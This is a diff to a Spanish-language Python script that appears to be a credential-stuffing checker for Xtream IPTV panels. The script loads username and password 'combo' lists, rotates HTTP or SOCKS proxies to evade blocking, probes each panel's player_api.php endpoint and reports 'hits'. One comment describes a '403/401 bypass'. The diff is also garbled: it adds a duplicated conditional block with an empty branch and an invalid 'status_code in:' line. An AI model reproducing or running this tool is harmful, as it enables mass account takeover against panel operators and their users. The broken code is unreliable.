@@ -96,9 +96,9 @@ def menu_asignacion_red_proxy(p_dir):
     print(BANNER_RECUADRO)
     
     print(f"{AMARILLO_BR}🛡️  SISTEMA DE ASIGNACIÓN DE RED IP:")
-    print(f" {NEON_VERDE}[01]{RESET} PROXIES DEL SISTEMA (Archivos Locales .txt en carpeta proxy)")
-    print(f" {NEON_VERDE}[02]{RESET} COLOCAR PROXIES MANUALMENTE (Pegar lista o IP:Port en consola)")
-    print(f" {NEON_VERDE}[03]{RESET} USAR INTERNET LOCAL DIRECTO (Sin Proxies)")
+    print(f" {NEON_VERDE}{RESET} PROXIES DEL SISTEMA (Archivos Locales .txt en carpeta proxy)")
+    print(f" {NEON_VERDE}{RESET} COLOCAR PROXIES MANUALMENTE (Pegar lista o IP:Port en consola)")
+    print(f" {NEON_VERDE}{RESET} USAR INTERNET LOCAL DIRECTO (Sin Proxies)")
     print(MAGENTA_BR + "══════════════════════════════════════════════")
     
     opc_principal = input(f"{AMARILLO_BR}👉 Selecciona tu modo de red (1-3): {CIAN_ELEC}").strip()
@@ -106,7 +106,7 @@ def menu_asignacion_red_proxy(p_dir):
     if opc_principal == '3':
         USAR_PROXIES = False
         PROXIES_GLOBALES = []
-        print(f"\n{AMARILLO_BR}⚠️  Sistema IP: Working directo con tu conexión de internet local.")
+        print(f"\n{AMARILLO_BR}⚠️  Sistema IP: Trabajando directo con tu conexión de internet local.")
         time.sleep(1.0)
         return
 
@@ -161,9 +161,9 @@ def menu_asignacion_red_proxy(p_dir):
         return
 
     print(f"\n{AMARILLO_BR}🌐 SELECCIONA EL PROTOCOLO REQUERIDO:")
-    print(f" {NEON_VERDE}[01]{RESET} HTTP / HTTPS")
-    print(f" {NEON_VERDE}[02]{RESET} SOCKS4")
-    print(f" {NEON_VERDE}[03]{RESET} SOCKS5")
+    print(f" {NEON_VERDE}{RESET} HTTP / HTTPS")
+    print(f" {NEON_VERDE}{RESET} SOCKS4")
+    print(f" {NEON_VERDE}{RESET} SOCKS5")
     
     opc_proto = input(f"{AMARILLO_BR}👉 Elige una opción (1-3): {CIAN_ELEC}").strip()
     prefix = "http://" if opc_proto == '1' else ("socks4://" if opc_proto == '2' else "socks5h://")
@@ -231,6 +231,10 @@ def realizar_consulta_panel(url_panel, usuario, contrasena, h_dir):
                             expira = datetime.fromtimestamp(timestamp_exp).strftime('%Y-%m-%d')
                             
                             segundos_restantes = timestamp_exp - int(time.time())
+                            if segundos_restantes <= 0:
+                                return "BAD", None, None  
+                            elif segundos_restantes <= 2592000:
+
                             if segundos_restantes <= 0:
                                 return "BAD", None, None  
                             elif segundos_restantes <= 2592000:
@@ -313,14 +317,14 @@ def bucle_procesador_masivo(c_dir, h_dir):
     print(MAGENTA_BR + "══════════════════════════════════════════════")
     
     try:
-        sel_c = int(input(f"{Fore.YELLOW}👈 Selecciona tu combo: {Fore.CYAN}")) - 1
+        sel_c = int(input(f"{AMARILLO_BR}👉 Selecciona tu combo: {CIAN_ELEC}")) - 1
         archivo_combo_final = os.path.join(c_dir, archivos_combo[sel_c])
     except:
         print(f"{ROJO_BR}❌ Selección inválida.")
         time.sleep(1.5)
         return
 
-    # ENTRADA DE SERVIDORES Y VALIDACIÓN ORIGINAL CON EMOTICONES EN COLOR LLAMATIVO
+    # ENTRADA DE SERVIDORES CON LA CORRECCIÓN EN VIVO ANTI-BLOQUEO (HTTP 403/401 BYPASS)
     print(f"\n{CIAN_ELEC}🌐 Ingresa los servidores Xtream objetivos (Escribe 'OK' para terminar):")
     lista_paneles = []
     for i in range(10):
@@ -338,8 +342,11 @@ def bucle_procesador_masivo(c_dir, h_dir):
             
             print(f"   {BLANCO_BR}⏳ Verificando conectividad con el panel...")
             try:
-                test_r = requests.get(f"{url_in.rstrip('/')}/player_api.php", timeout=3.0)
-                if test_r.status_code == 200:
+                # BYPASS: Evaluamos respuestas válidas de control (200 OK, 401 Unauthorized, 403 Forbidden)
+                test_url = f"{url_in.rstrip('/')}/player_api.php?username=test&password=test"
+                test_r = requests.get(test_url, timeout=3.0)
+                
+                if test_r.status_code in:
                     print(f"   {NEON_VERDE}✅ Servidor Activo y Respondiendo.")
                     lista_paneles.append(url_in)
                 else:
@@ -407,12 +414,6 @@ def bucle_procesador_masivo(c_dir, h_dir):
                         
                     print(f"\n{NEON_VERDE}[HIT DETECTADO] 🥷🏻🇪🇨\n{msg.strip()}\n")
                 
-                if procesados % 10 == 0 or procesados == totales:
-                    tiempo_transcurrido = time.time() - tiempo_inicio
-                    cpm = int((procesados / tiempo_transcurrido) * 60) if tiempo_transcurrido > 0 else 0
-                    
-
-                # REFRESCADOR ANTI-TILDE: Actualiza la barra inferior solo cada 10 cuentas para fluidez absoluta
                 if procesados % 10 == 0 or procesados == totales:
                     tiempo_transcurrido = time.time() - tiempo_inicio
                     cpm = int((procesados / tiempo_transcurrido) * 60) if tiempo_transcurrido > 0 else 0
